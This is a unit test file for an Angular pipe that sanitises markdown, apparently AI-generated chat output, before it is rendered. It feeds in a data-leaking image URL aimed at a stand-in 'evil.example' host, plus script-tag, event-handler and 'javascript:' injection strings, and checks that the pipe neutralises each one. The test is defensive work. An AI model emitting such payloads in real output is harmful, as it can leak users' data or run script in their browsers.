import { provideZonelessChangeDetection } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import { MarkdownPipe } from './markdown.pipe';

describe('MarkdownPipe', () => {
    let pipe: MarkdownPipe;

    beforeEach(() => {
        TestBed.configureTestingModule({ providers: [provideZonelessChangeDetection()] });
        pipe = TestBed.runInInjectionContext(() => new MarkdownPipe());
        // Angular warns in dev mode whenever the sanitizer strips something.
        spyOn(console, 'warn');
    });

    /** Parses the pipe output so assertions don't depend on attribute order. */
    function render(markdown: string): HTMLElement {
        const container = document.createElement('div');
        container.innerHTML = pipe.transform(markdown);
        return container;
    }

    it('returns an empty string for empty input', () => {
        expect(pipe.transform('')).toBe('');
    });

    it('renders markdown', () => {
        const html = render('## Title\n\n**bold**');
        expect(html.querySelector('h2')?.textContent).toBe('Title');
        expect(html.querySelector('strong')?.textContent).toBe('bold');
    });

    it('opens links in a new tab without an opener', () => {
        const link = render('[Cadre](https://cadreai.com)').querySelector('a')!;
        expect(link.getAttribute('target')).toBe('_blank');
        expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    });

    it('turns remote images into links so nothing loads on render', () => {
        const html = render('![Logo](https://evil.example/leak?q=secret)');
        expect(html.querySelector('img')).toBeNull();

        const link = html.querySelector('a')!;
        expect(link.getAttribute('href')).toBe('https://evil.example/leak?q=secret');
        expect(link.textContent).toBe('Logo');
        expect(link.getAttribute('target')).toBe('_blank');
    });

    it('turns images without an http(s) source into their alt text', () => {
        const html = render('see ![local](/x.png) here');
        expect(html.querySelector('img')).toBeNull();
        expect(html.querySelector('a')).toBeNull();
        expect(html.textContent).toContain('see local here');
    });

    it('labels an image with no alt text', () => {
        expect(render('![](https://e.example/a.png)').querySelector('a')?.textContent).toBe('Image');
    });

    it('strips raw images the model writes as HTML', () => {
        expect(render('<img src="https://e.example/a.png" alt="x">').querySelector('img')).toBeNull();
    });

    it('strips scripts and event handlers', () => {
        const html = render('<script>alert(1)</script><p onclick="alert(1)">hi</p>');
        expect(html.querySelector('script')).toBeNull();
        expect(html.querySelector('p')?.hasAttribute('onclick')).toBeFalse();
    });

    it('neutralises javascript: links', () => {
        const href = render('[x](javascript:alert(1))').querySelector('a')?.getAttribute('href') ?? '';
        expect(href.startsWith('javascript:')).toBeFalse();
    });
});
